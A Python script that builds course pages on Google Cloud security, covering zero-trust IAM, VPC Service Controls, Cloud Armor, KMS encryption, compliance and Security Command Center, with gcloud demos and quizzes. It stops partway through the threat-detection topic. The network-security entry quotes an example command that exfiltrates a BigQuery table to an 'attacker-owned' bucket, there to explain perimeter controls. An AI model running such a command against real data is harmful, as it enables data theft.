#!/usr/bin/env python3
"""
generate_phase5.py - Generates Topics 034 to 039 covering Phase 5: Security and Compliance.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from build_website import build_topic_page
from batch_generate_full import make_d1_map, make_d2_flow, make_d3_failure, make_analogy

PHASE5_TOPICS = [
    # 034: Advanced IAM & Zero Trust
    {
        "topic_no": "034",
        "roadmap_id": "5.1",
        "title": "Advanced IAM, Identity Federation & Zero Trust",
        "page_type": "service",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Next-generation identity architectures: IAM Conditions, Deny Policies, Workload Identity Federation (AWS/GitHub without keys), Privileged Access Manager (PAM), and BeyondCorp Identity-Aware Proxy (IAP).",
        "comp1": ("External GitHub CI/CD", "Workload Identity", "control", "Requests short-lived OIDC tokens without storing static GCP service account keys."),
        "comp2": ("Security Token Service", "STS & IAM Federation", "control", "Exchanges external federated token for a short-lived scoped GCP access token."),
        "comp3": ("GCP Resource Target", "Compute / Storage", "data", "Enforces attribute-based access control (ABAC) and IAM Deny policies."),
        "comp4": ("Privileged Access Manager", "Just-In-Time Elevation", "control", "Grants temporary elevated roles with automated approvals and audit logging."),
        "flow1": "External GitHub runner sends signed JWT token to GCP Security Token Service.",
        "flow2": "STS validates issuer and audience, minting temporary 1-hour service account token.",
        "flow3": "Runner authenticates to Artifact Registry; IAM Deny policies verify caller is not from unauthorized IP range.",
        "fail": "A malicious actor acquires a leaked static JSON service account key.",
        "heal": "Organization Policy <code>iam.disableServiceAccountKeyCreation</code> blocks all key authentication.",
        "city_concept": "City Security Badges & Biometric Checkpoints",
        "p1": "Civic workers were carrying brass master keys that could open any city warehouse, bank vault, or subway tunnel. Keys were constantly lost.",
        "p2": "Warden Ward replaced brass keys with dynamic biometric badges (Zero Trust & Workload Identity) that expire after 60 minutes.",
        "p3": "When a rogue clerk attempted to enter the municipal vault at midnight, automated time-based locks (IAM Conditions) rejected the badge.",
        "p4": "Physical brass keys must be re-keyed by locksmiths; cloud identity keys are completely eliminated through token federation.",
        "part1_html": """
        <h3>The Situation: The Hazard of Static Service Account Keys</h3>
        <p>
          At <strong>Brightloaf Bakery</strong>, an engineer committed a service account private key JSON file into a public GitHub repository. Within 15 minutes, automated bots discovered the key and spun up hundreds of GPU instances for cryptomining, generating a $45,000 bill.
        </p>
        <p>
          Modern cloud security is founded on the <strong>Zero Trust</strong> model: <em>"Never trust, always verify."</em> Static private keys are an anti-pattern. Using <strong>Workload Identity Federation</strong>, external systems (GitHub Actions, AWS EC2, GitLab, on-prem Kubernetes) authenticate to Google Cloud using short-lived OpenID Connect (OIDC) tokens with zero secrets to store or rotate.
        </p>
        <div class="callout">
          <div class="callout-title">Advanced IAM Governance Primitives</div>
          <ul>
            <li><strong>Workload Identity Federation:</strong> Exchanging AWS IAM or GitHub OIDC tokens for temporary GCP access tokens via Security Token Service (STS).</li>
            <li><strong>IAM Conditions:</strong> Applying attribute-based access control (ABAC) based on resource tags, IP address, day of week, or time of day.</li>
            <li><strong>IAM Deny Policies:</strong> Hard overrides that take precedence over all grant policies, preventing accidental privilege escalation.</li>
            <li><strong>Privileged Access Manager (PAM):</strong> Just-in-time, temporary privilege elevation with automated workflow approvals.</li>
            <li><strong>Identity-Aware Proxy (IAP):</strong> Context-aware zero-trust access to web apps and SSH/RDP without public IPs or VPNs.</li>
          </ul>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: Eliminating Service Account Keys</h4>
        <p>Enforce the Organization Policy constraint <code>constraints/iam.disableServiceAccountKeyCreation</code>. Workloads inside GCP use default service accounts or GKE Workload Identity; workloads outside GCP use Workload Identity Federation.</p>
        <h4>Layer 2 — Practitioner: IAM Conditions & Context-Aware Access</h4>
        <p>Enforce conditional access: e.g., allow deployment engineers access to production <em>only between 09:00 and 17:00 UTC</em> and <em>only when connecting from corporate IP ranges</em> using CEL expressions.</p>
        <h4>Layer 3 — Architect: Deny Policies & Principal Access Boundaries</h4>
        <p>IAM Deny policies act as organizational guardrails. Even if a project owner grants <code>roles/editor</code> to a user, a Deny policy targeting specific permissions (like <code>iam.serviceAccounts.delete</code>) cannot be overridden at the project level.</p>
        <h4>Layer 4 — Staff: Zero-Trust BeyondCorp Architecture</h4>
        <p>Replace legacy corporate VPNs with BeyondCorp. IAP verifies user identity, device health, location, and MFA on every single HTTP request before proxying traffic to private internal services.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Warden Ward verifies every visitor's badge and clearance level at municipal checkpoints, issuing single-use passes.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Hands-On Demo: Configuring Workload Identity Federation for GitHub Actions</div>
          <p>Set up keyless authentication between GitHub Actions CI/CD and Google Cloud.</p>
        </div>
        <pre><code class="language-bash"># 1. Create a Workload Identity Pool
gcloud iam workload-identity-pools create "github-pool" \\
    --location="global" \\
    --display-name="GitHub Actions Pool"

# 2. Add an OIDC Provider for GitHub
gcloud iam workload-identity-pools providers create-oidc "github-provider" \\
    --workload-identity-pool="github-pool" \\
    --location="global" \\
    --issuer-uri="https://token.actions.githubusercontent.com" \\
    --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository"

# 3. Allow GitHub repository to impersonate a service account
gcloud iam service-accounts add-iam-policy-binding "ci-builder@my-project.iam.gserviceaccount.com" \\
    --role="roles/iam.workloadIdentityUser" \\
    --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"</code></pre>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Advanced IAM (Question 1)</span>
          <p><strong>Your security team mandates that external CI/CD pipelines running on GitHub Actions must deploy artifacts to Google Cloud without storing long-lived service account key files in GitHub secrets. How should you design this authentication flow?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! Workload Identity Federation allows GitHub Actions to exchange an OIDC token for short-lived Google Cloud credentials without storing any private key files.')">A) Configure Workload Identity Federation with GitHub as an OIDC provider, allowing the GitHub runner to exchange short-lived tokens via STS to impersonate a GCP service account.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Encrypting static service account keys in GitHub secrets still exposes long-lived credentials to rotation and leakage risks.')">B) Generate a service account private key JSON, encrypt it with PGP, and store it in GitHub Secrets.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Service account keys should never be committed into source code.')">C) Commit the service account key into a private Git submodule.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Making the registry public exposes proprietary application code to the world.')">D) Make the Artifact Registry publicly accessible with write access enabled for all users.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/iam/docs/workload-identity-federation' target='_blank'>Workload Identity Federation Documentation</a></li><li><a href='https://cloud.google.com/iap/docs' target='_blank'>Identity-Aware Proxy (IAP) Overview</a></li></ul>"
    },

    # 035: Network Security: VPC-SC, Cloud Armor & Firewalls
    {
        "topic_no": "035",
        "roadmap_id": "5.2",
        "title": "Network Security: VPC Service Controls, Cloud Armor & Firewalls",
        "page_type": "service",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Protecting against attacks and data exfiltration: VPC Service Controls perimeters, Cloud Armor WAF (OWASP Top 10) & DDoS defense, hierarchical firewall policies, and Private Service Connect.",
        "comp1": ("Public Web Traffic", "Internet Clients", "data", "Incoming user requests filtered by Cloud Armor WAF rate-limiting and OWASP rules."),
        "comp2": ("Cloud Armor & Ingress", "Edge Security", "data", "Blocks SQL injection, cross-site scripting (XSS), and Layer 7 volumetric attacks."),
        "comp3": ("Protected VPC Perimeter", "VPC Service Controls", "control", "Enforces cryptographic data boundaries preventing data exfiltration to unauthorized buckets."),
        "comp4": ("Private Service Connect", "PSC Private Endpoint", "data", "Accesses managed Google APIs entirely over internal private IP addresses without internet traversal."),
        "flow1": "External client sends HTTP request with malicious SQL injection payload in query string.",
        "flow2": "Cloud Armor pre-configured WAF rule evaluates payload and returns HTTP 403 Forbidden at Google's edge.",
        "flow3": "Legitimate traffic routes via Private Service Connect to Cloud Storage within a VPC Service Controls perimeter.",
        "fail": "A rogue insider attempts to copy sensitive BigQuery data to an external unauthorized GCP project.",
        "heal": "VPC Service Controls perimeter blocks cross-project API egress, logging an audit violation to Security Command Center.",
        "city_concept": "City Perimeter Fortifications & Inspection Gates",
        "p1": "Smugglers were sneaking contraband through unregulated river docks and loading municipal wagons to ship city secrets outside the gates.",
        "p2": "Warden Ward erected fortified perimeter walls (VPC Service Controls) and customs inspection checkpoints (Cloud Armor).",
        "p3": "When a rogue merchant attempted to take municipal gold bars through the east gate, automated weight sensors locked the turnstile.",
        "p4": "City stone gates take days to rebuild; cloud perimeter policies update globally across Google's edge network in seconds.",
        "part1_html": """
        <h3>The Situation: The Threat of Data Exfiltration</h3>
        <p>
          Traditional network security focuses on keeping attackers out. But in the cloud, one of the greatest risks is <strong>data exfiltration by insiders or compromised credentials</strong>.
        </p>
        <p>
          Even with strict IAM roles, a compromised service account with read access to BigQuery can simply run:
          <br><code>bq extract sensitive_table gs://attacker-owned-bucket/data.csv</code>.
          <br>Because both projects exist in Google Cloud, traditional firewall rules cannot stop this call!
        </p>
        <div class="callout">
          <div class="callout-title">The Three Pillars of GCP Network Security</div>
          <ul>
            <li><strong>Cloud Armor:</strong> Edge WAF and DDoS mitigation. Protects against OWASP Top 10 vulnerabilities (SQLi, XSS, LFI/RFI), provides rate limiting, geo-blocking, and bot management.</li>
            <li><strong>VPC Service Controls (VPC-SC):</strong> Creates a security perimeter around Google-managed services (Cloud Storage, BigQuery, Vertex AI). Prevents data from leaving the perimeter, even with valid IAM credentials.</li>
            <li><strong>Hierarchical Firewall Policies:</strong> Enforces organization-wide security rules inherited by all folders and VPCs (e.g., mandate deny-all ingress on port 22/3389).</li>
          </ul>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: Zero Public IPs & Private Google Access</h4>
        <p>Never assign external public IP addresses to backend compute instances. Use Private Google Access or Private Service Connect (PSC) to reach Google APIs privately over Google's internal network.</p>
        <h4>Layer 2 — Practitioner: Cloud Armor Preconfigured WAF Rules</h4>
        <p>Enable preconfigured ModSecurity Core Rule Set (CRS) rules: <code>evaluatePreconfiguredExpr('sqli-v33-stable')</code> and <code>evaluatePreconfiguredExpr('xss-v33-stable')</code> to block web exploitation attempts.</p>
        <h4>Layer 3 — Architect: VPC Service Controls Perimeters & Ingress/Egress Rules</h4>
        <p>Deploy VPC Service Controls in <strong>Dry-Run Mode</strong> first to monitor audit logs for potential breakage. Once validated, enforce perimeter boundaries and define precise ingress/egress rules based on context-aware access levels.</p>
        <h4>Layer 4 — Staff: Cloud NGFW & Intrusion Detection (Cloud IDS)</h4>
        <p>Staff architects deploy Cloud Next Generation Firewall (NGFW) Enterprise with intrusion prevention (IPS) powered by Palo Alto Networks threat signatures to inspect east-west traffic inside the VPC.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Warden Ward inspects all incoming cargo at the port while ensuring city ledgers never leave the municipal archives.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Hands-On Demo: Creating a Cloud Armor Security Policy</div>
          <p>Protect an application against SQL injection attacks and rate-limit abusive clients.</p>
        </div>
        <pre><code class="language-bash"># 1. Create Cloud Armor policy
gcloud compute security-policies create sec-policy-web \\
    --description="WAF and rate limiting policy"

# 2. Add OWASP SQL Injection rule
gcloud compute security-policies rules create 1000 \\
    --security-policy=sec-policy-web \\
    --expression="evaluatePreconfiguredExpr('sqli-v33-stable')" \\
    --action=deny-403 \\
    --description="Block SQL Injection"

# 3. Add Rate Limiting (max 100 requests per minute per client IP)
gcloud compute security-policies rules create 2000 \\
    --security-policy=sec-policy-web \\
    --action=rate-based-ban \\
    --rate-limit-threshold-count=100 \\
    --rate-limit-threshold-interval-sec=60 \\
    --ban-duration-sec=300 \\
    --conform-action=allow \\
    --exceed-action=deny-429 \\
    --enforce-on-key=IP

# 4. Attach policy to backend service
gcloud compute backend-services update web-backend-service \\
    --security-policy=sec-policy-web \\
    --global</code></pre>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Network Security (Question 1)</span>
          <p><strong>A financial institution requires that data stored in Cloud Storage and BigQuery cannot be exfiltrated to external storage buckets or unauthorized accounts, even if an employee's service account credentials with administrative roles are stolen. Which security capability satisfies this requirement?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! VPC Service Controls establishes a cryptographic security perimeter around multi-tenant Google APIs (GCS, BigQuery), preventing data from being copied outside the authorized perimeter regardless of IAM permissions.')">A) Configure a VPC Service Controls perimeter encompassing the project's BigQuery datasets and Cloud Storage buckets.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'VPC firewall rules apply to VM instance interfaces; they cannot inspect or block multi-tenant Google API HTTPS calls.')">B) Create a VPC egress firewall rule blocking TCP port 443.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Cloud Armor is an ingress WAF for load balancers; it does not protect against data exfiltration via Google APIs.')">C) Attach a Cloud Armor security policy to the default VPC network.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'IAM conditions restrict when or where roles apply, but do not prevent a compromised token from writing to an external bucket if IAM permits it.')">D) Apply IAM Conditions restricting role grants to business hours.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/vpc-service-controls/docs/overview' target='_blank'>VPC Service Controls Overview</a></li><li><a href='https://cloud.google.com/armor/docs' target='_blank'>Google Cloud Armor Overview</a></li></ul>"
    },

    # 036: Data Protection: Cloud KMS, DLP & Encryption
    {
        "topic_no": "036",
        "roadmap_id": "5.3",
        "title": "Data Protection: Cloud KMS, Sensitive Data Protection & Encryption",
        "page_type": "service",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Protecting data at rest, in transit, and in use: Google default encryption vs CMEK vs CSEK, Cloud KMS key rings and rotation, Sensitive Data Protection (Cloud DLP) de-identification, and Confidential VMs.",
        "comp1": ("Raw Ingestion Stream", "Sensitive User Records", "data", "Transmits credit cards, social security numbers, and patient medical records."),
        "comp2": ("Sensitive Data Protection", "Cloud DLP API", "control", "Inspects, masks, tokenizes, and de-identifies PII before persistent storage."),
        "comp3": ("Cloud KMS / HSM", "Key Management Service", "control", "Manages Customer-Managed Encryption Keys (CMEK) with automated 90-day rotation."),
        "comp4": ("Encrypted Persistence", "CMEK Storage / BigQuery", "data", "Stores encrypted data blocks protected by AES-256 keys in FIPS 140-2 Level 3 HSMs."),
        "flow1": "Client submits customer registration containing plaintext social security numbers.",
        "flow2": "Sensitive Data Protection API inspects payload and replaces SSN with cryptographic surrogate token.",
        "flow3": "Data is encrypted using Cloud KMS CMEK and persisted to Cloud Storage and BigQuery.",
        "fail": "Compliance officer discovers unauthorized access attempt on raw credit card column.",
        "heal": "BigQuery Column-Level Security policy tags restrict column access exclusively to authorized billing auditors.",
        "city_concept": "City Vaults, Ciphers & Watermarking",
        "p1": "Tax records and patient health files were written in plain ink on parchment, readable by any courier walking down the hallway.",
        "p2": "Archivist Arthur introduced cipher seals (Cloud KMS) and redacting ink stamps (Cloud DLP) to mask sensitive citizen identities.",
        "p3": "When a courier dropped a tax ledger in the street, onlookers could only see redacted black bars and scrambled cipher tokens.",
        "p4": "Parchment redaction requires physical ink and shears; digital DLP transforms millions of rows in seconds using regex and machine learning.",
        "part1_html": """
        <h3>The Situation: The Spectrum of Encryption on Google Cloud</h3>
        <p>
          By default, <strong>100% of data at rest in Google Cloud is encrypted</strong> using AES-256 with keys owned and managed by Google. But in regulated industries (finance, healthcare, government), regulatory mandates require organizations to maintain sovereign control over their encryption keys.
        </p>
        <p>
          Google Cloud provides a clear encryption hierarchy:
        </p>
        <div class="callout">
          <div class="callout-title">The Three Levels of Encryption at Rest</div>
          <ol>
            <li><strong>Google-Managed Keys (Default):</strong> Zero operational configuration. Google manages key generation, rotation, and storage.</li>
            <li><strong>Customer-Managed Encryption Keys (CMEK):</strong> Keys generated and controlled by the customer inside <strong>Cloud KMS</strong> or dedicated <strong>Cloud HSM</strong> (FIPS 140-2 Level 3 hardware). You control key rotation schedules and can revoke access instantly, rendering data unreadable.</li>
            <li><strong>Customer-Supplied Encryption Keys (CSEK):</strong> You supply raw AES-256 keys in API calls. Google never stores the key in any persistent medium. If you lose the key, data is permanently unrecoverable.</li>
          </ol>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: Cloud KMS Hierarchy (Key Rings & Keys)</h4>
        <p>KMS organizes keys in: <code>Project &gt; Location &gt; KeyRing &gt; CryptoKey &gt; CryptoKeyVersion</code>. Key rotation creates a new version for encrypting new data while preserving older versions for decrypting historical data.</p>
        <h4>Layer 2 — Practitioner: Sensitive Data Protection (Cloud DLP)</h4>
        <p>Inspects structured datasets, unstructured files, and images for over 150 built-in infoTypes (credit cards, passport numbers, email addresses). Supports <strong>de-identification</strong> via masking, cryptographic hashing, and format-preserving encryption (FPE).</p>
        <h4>Layer 3 — Architect: BigQuery Column-Level & Row-Level Security</h4>
        <p>Apply <strong>Policy Tags</strong> via Dataplex/Data Catalog to restrict sensitive columns (e.g., salary, SSN) to authorized IAM groups. Apply <strong>Row-Level Security</strong> to ensure regional managers can only query data from their specific territory.</p>
        <h4>Layer 4 — Staff: Confidential Computing (Encryption in Use)</h4>
        <p>Protects data while being processed in memory. <strong>Confidential VMs</strong> and <strong>Confidential GKE Nodes</strong> leverage AMD SEV hardware memory encryption keys generated on-chip by the CPU, isolating memory from host hypervisors.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Arthur locks master registry keys inside titanium safes, requiring two council keys to open.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Hands-On Demo: Creating a CMEK Key and Encrypting a Cloud Storage Bucket</div>
          <p>Provision a Cloud KMS key ring and create a bucket encrypted with your customer-managed key.</p>
        </div>
        <pre><code class="language-bash"># 1. Create a Key Ring
gcloud kms keyrings create ring-production \\
    --location=us-central1

# 2. Create a CryptoKey with 90-day rotation
gcloud kms keys create key-storage-encrypt \\
    --keyring=ring-production \\
    --location=us-central1 \\
    --purpose=encryption \\
    --rotation-period=7776000s \\
    --next-rotation-time="+7776000s"

# 3. Grant GCS Service Account permission to encrypt/decrypt
GCS_SA=$(gcloud storage service-agent)
gcloud kms keys add-iam-policy-binding key-storage-encrypt \\
    --keyring=ring-production \\
    --location=us-central1 \\
    --member="serviceAccount:${GCS_SA}" \\
    --role="roles/cloudkms.cryptoKeyEncrypterDecrypter"

# 4. Create bucket with CMEK default
gcloud storage buckets create gs://secure-cmek-bucket-12345 \\
    --location=us-central1 \\
    --default-encryption-key="projects/PROJECT_ID/locations/us-central1/keyRings/ring-production/cryptoKeys/key-storage-encrypt"</code></pre>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Data Protection (Question 1)</span>
          <p><strong>A banking client must comply with regulatory requirements mandating that all cardholder data stored in Cloud Storage must be encrypted with keys where the client controls key rotation, and the client must retain the ability to instantly revoke access to all stored data in an emergency. Which approach fulfills this requirement?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! Customer-Managed Encryption Keys (CMEK) via Cloud KMS allow the customer to manage rotation schedules and disable the key at any time, immediately rendering the encrypted objects inaccessible.')">A) Use Customer-Managed Encryption Keys (CMEK) with Cloud KMS; disable the CryptoKey to instantly revoke access.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Google-managed encryption does not give the client control over key rotation or emergency key revocation.')">B) Rely on Google default encryption at rest.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Client-side manual encryption before upload adds high application complexity and does not integrate natively with Cloud Storage lifecycle policies.')">C) Encrypt files manually with zip passwords before uploading.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Bucket Lock enforces WORM retention and prevents deletion, but does not provide cryptographic key revocation.')">D) Enable Cloud Storage Bucket Lock with Object Retention.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/kms/docs' target='_blank'>Cloud Key Management Service (KMS) Documentation</a></li><li><a href='https://cloud.google.com/sensitive-data-protection/docs' target='_blank'>Sensitive Data Protection (Cloud DLP) Overview</a></li></ul>"
    },

    # 037: Compliance and Governance
    {
        "topic_no": "037",
        "roadmap_id": "5.4",
        "title": "Compliance, Governance & Assured Workloads",
        "page_type": "concept",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Navigating enterprise compliance: The Shared Responsibility Model, global certifications (SOC 2, PCI-DSS, HIPAA, GDPR, FedRAMP), Assured Workloads, and Policy as Code guardrails.",
        "comp1": ("Regulatory Standard", "PCI-DSS / HIPAA / GDPR", "control", "Defines strict statutory requirements for data residency, auditability, and isolation."),
        "comp2": ("Assured Workloads", "Compliance Guardrails", "control", "Automatically enforces resource location constraints and personnel access restrictions."),
        "comp3": ("Regulated Workload VPC", "Isolated Project", "data", "Hosts sensitive applications inside boundary-enforced environments with full audit logging."),
        "comp4": ("Compliance Reports Manager", "Audit Evidence", "control", "Provides third-party SOC 1/2/3 and ISO 27001 audit certifications for regulatory filings."),
        "flow1": "Enterprise selects compliance regime (e.g. EU GDPR or US FedRAMP High) in Google Cloud Console.",
        "flow2": "Assured Workloads configures Organization Policy constraints restricting data residency to approved regions.",
        "flow3": "Platform generates compliance telemetry and audit logs streaming to immutable compliance archive.",
        "fail": "A junior developer attempts to spin up a compute instance in an unapproved geographic territory.",
        "heal": "Assured Workloads organization constraint instantly rejects the API request, preventing compliance violation.",
        "city_concept": "City Public Health Inspections & Guild Charters",
        "p1": "Taverns and bakeries were operating with dirty water and spoiled grain, claiming that because the city paved the street outside, food was safe.",
        "p2": "Chief Inspector Ines instituted the Shared Municipal Charter: the city guarantees clean water to the curb, but tavern keepers must cook food to 100 degrees.",
        "p3": "During a surprise inspection, Ines shut down a brewery that failed to maintain temperature logs, protecting public health.",
        "p4": "City health audits happen once a year; cloud compliance guardrails (Policy as Code) enforce rules continuously on every API call.",
        "part1_html": """
        <h3>The Situation: The Shared Responsibility Model for Compliance</h3>
        <p>
          A common mistake made by leadership is assuming that because Google Cloud has SOC 2, ISO 27001, and HIPAA certifications, any application deployed on GCP is automatically compliant.
        </p>
        <p>
          Compliance follows the <strong>Shared Responsibility Model</strong>:
        </p>
        <div class="callout">
          <div class="callout-title">Shared Responsibility Breakdown</div>
          <ul>
            <li><strong>Google's Responsibility (Security OF the Cloud):</strong> Physical datacenter security, hardware infrastructure, undersea fiber, hypervisor isolation, host OS patching, and third-party facility audits.</li>
            <li><strong>Customer's Responsibility (Security IN the Cloud):</strong> IAM permission assignments, firewall rules, data classification, encryption key rotation, guest OS patching, application vulnerabilities, and regulatory audit compliance.</li>
          </ul>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: Global Compliance Certifications</h4>
        <p>Google maintains certifications across SOC 1/2/3, ISO/IEC 27001, PCI-DSS Level 1, HIPAA, FedRAMP, and GDPR. Access official third-party audit reports via the <strong>Compliance Reports Manager</strong>.</p>
        <h4>Layer 2 — Practitioner: Assured Workloads</h4>
        <p><strong>Assured Workloads</strong> simplifies compliance by applying automated guardrails: enforcing data location constraints (preventing resources outside specific jurisdictions), access transparency, and sovereign personnel access controls.</p>
        <h4>Layer 3 — Architect: PCI-DSS & HIPAA Architectures</h4>
        <p>For PCI-DSS, isolate the Cardholder Data Environment (CDE) in dedicated GCP projects with no internet ingress; tokenize credit card data immediately upon ingestion. For HIPAA, sign a Business Associate Agreement (BAA) with Google and enable Data Access audit logging.</p>
        <h4>Layer 4 — Staff: Policy as Code (Policy Controller / Gatekeeper)</h4>
        <p>Staff architects eliminate manual security reviews by codifying compliance rules in OPA (Open Policy Agent) Gatekeeper and Terraform Sentinel. Pull requests that violate compliance rules are blocked before deployment.</p>
        """,
        "part3_narrative_html": "<p>In Cloud City, Ines provides merchants with certified inspection seals, verifying that municipal safety standards are upheld.</p>",
        "part4_demo_html": """
        <div class="callout">
          <div class="callout-title">Practice Exercise: Designing a HIPAA-Compliant Architecture</div>
          <p>
            Brightloaf Health is designing a patient appointment portal storing Protected Health Information (PHI). List 4 mandatory architectural controls required for HIPAA compliance on Google Cloud.
          </p>
        </div>
        <button class="btn-de" id="toggle-solution-btn" onclick="toggleSolution()" style="margin-bottom:14px;">👁 Show Solution & Rubric</button>
        <div id="solution-block" style="display:none; background:#0d1222; padding:18px; border-radius:8px; border:1px solid var(--panel-border);">
          <h4>HIPAA Architecture Controls</h4>
          <ol>
            <li><strong>Execute BAA:</strong> Sign the Google Cloud Business Associate Agreement (BAA) before storing any PHI.</li>
            <li><strong>Audit Logging:</strong> Enable <code>DATA_READ</code> and <code>DATA_WRITE</code> Data Access audit logs on all databases storing PHI and retain logs for a minimum of 6 years in immutable locked storage.</li>
            <li><strong>Encryption & Key Control:</strong> Enforce encryption in transit (TLS 1.3) and use Customer-Managed Encryption Keys (CMEK) via Cloud KMS for data at rest.</li>
            <li><strong>Network & Access Isolation:</strong> Place backend workloads in private subnets with no public IPs, enforcing zero-trust access via Identity-Aware Proxy (IAP) and IAM least privilege.</li>
          </ol>
        </div>
        """,
        "quiz_html": """
        <div class="quiz-card">
          <span class="quiz-badge">Band: Compliance Responsibility (Question 1)</span>
          <p><strong>A healthcare startup deploys an unpatched MySQL 5.6 database on a Compute Engine VM with an open 0.0.0.0/0 firewall rule. A data breach occurs. Who is legally responsible for the security failure under the cloud shared responsibility model?</strong></p>
          <ul class="quiz-options">
            <li class="quiz-option" onclick="checkQuiz(this, true, 'Correct! Under the Shared Responsibility Model, the customer is strictly responsible for guest OS patching, database configurations, and network firewall rules.')">A) The customer, because guest OS patching, database security, and firewall configurations are the customer's sole responsibility on IaaS.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Google secures the underlying physical infrastructure and hypervisor, not customer-managed VMs.')">B) Google Cloud, because Compute Engine is an enterprise certified service.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Shared responsibility does not split operational patching of customer VMs.')">C) Shared 50/50 between Google Cloud and the customer.</li>
            <li class="quiz-option" onclick="checkQuiz(this, false, 'Compliance auditors audit systems; they do not operate customer infrastructure.')">D) The third-party compliance auditor who issued the SOC 2 certificate.</li>
          </ul>
          <div class="quiz-explanation"></div>
        </div>
        """,
        "reading_html": "<ul><li><a href='https://cloud.google.com/assured-workloads/docs' target='_blank'>Assured Workloads Documentation</a></li><li><a href='https://cloud.google.com/security/compliance' target='_blank'>Google Cloud Compliance Resource Center</a></li></ul>"
    },

    # 038: Security Operations & Security Command Center
    {
        "topic_no": "038",
        "roadmap_id": "5.5",
        "title": "Security Operations: Security Command Center & Threat Detection",
        "page_type": "service",
        "phase": "Phase 5 — Security and Compliance",
        "lead": "Enterprise SecOps: Security Command Center (SCC Standard vs Premium vs Enterprise), Event Threat Detection, Container Threat Detection, attack path simulation, and Chronicle SIEM/SOAR.",
        "comp1": ("Security Telemetry Feeds", "VPC & Audit Logs", "data", "Streams real-time DNS queries, firewall flows, and IAM audit logs to threat engines."),
        "comp2": ("Event Threat Detection", "SCC Premium Engine", "control", "Applies machine learning to detect malware, cryptomining, brute-force, and data exfiltration."),
        "comp3": ("Security Command Center", "Central SecOps Dashboard", "control", "Aggregates vulnerabilities, misconfigurations, and active attack paths across the organization."),
        "comp4": ("Automated SOAR Playbooks", "Cloud Functions / PubSub", "control", "Automatically quarantines compromised VMs and revokes leaked IAM credentials in seconds."),
        "flow1": "A compromised VM establishes an outbound connection to a known cryptomining mining pool.",
        "flow2": "Event Threat Detection analyzes VPC flow logs and flags a High-severity finding in Security Command Center.",
        "flow3": "SCC dispatches a Pub/Sub notification to an automated remediation function that isolates the VM's network tag.",
        "fail": "An engineer mistakenly opens a firewall rule allowing SSH port 22 from 0.0.0.0/0.",
        "heal": "SCC Misconfiguration Detector flags the violation within 60 seconds and triggers auto-remediation to restore the deny rule.",
        "city_concept": "City Night Watch & Central Citadel Sirens",
        "p1": "When bandits infiltrated the outer warehouse district at night, guards in the north tower had no way to alert guards in the southern garrison.",
        "p2": "The Night Watch built signal beacons and telegraph sirens (Security Command Center) linking all city gates to the Central Citadel.",
        "p3": "When a suspicious cart was spotted at Midnight Gate, the Citadel signaled all inner gates to lock immediately, capturing the intruders.",
        "p4": "Signal fire beacons require clear weather and manual watchmen; cloud threat detection analyzes millions of network flows per second automatically.",
        "part1_html": """
        <h3>The Situation: The Need for Centralized Cloud Threat Visibility</h3>
        <p>
          In a large enterprise with hundreds of projects, dozens of VPCs, and thousands of virtual machines and containers, identifying security threats manually is impossible. 
        </p>
        <p>
          <strong>Security Command Center (SCC)</strong> is Google Cloud's centralized vulnerability management and threat detection platform. It operates at the Organization level, providing unified visibility into misconfigurations, software vulnerabilities, and active malicious activity.
        </p>
        <div class="callout">
          <div class="callout-title">Security Command Center Tiers</div>
          <ul>
            <li><strong>SCC Standard (Free):</strong> Asset discovery, basic asset inventory search, and export to Cloud Logging.</li>
            <li><strong>SCC Premium:</strong> Event Threat Detection (analyzing logs for malware/cryptomining), Container Threat Detection, Web Security Scanner, attack path simulation, and compliance monitoring.</li>
            <li><strong>SCC Enterprise:</strong> Blends cloud posture management with Google Security Operations (Chronicle SIEM and SOAR) for end-to-end modern SecOps.</li>
          </ul>
        </div>
        """,
        "part2_ladder_html": """
        <h4>Layer 1 — Foundation: SCC Asset Inventory & Misconfiguration Findings</h4>
